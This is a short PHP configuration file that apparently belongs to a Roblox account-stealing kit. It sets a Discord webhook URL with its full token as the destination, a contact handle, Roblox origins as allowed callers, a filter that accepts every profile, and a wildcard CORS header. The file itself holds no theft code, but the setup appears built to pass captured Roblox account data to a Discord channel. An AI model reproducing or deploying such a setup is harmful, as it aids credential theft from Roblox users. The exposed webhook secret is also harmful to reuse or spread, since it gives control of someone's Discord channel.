<?php


    $webhook = "https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz";
    $discord_contact = "xen.dexx";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
       require("status.php");
           header("Access-Control-Allow-Origin: *");
?>
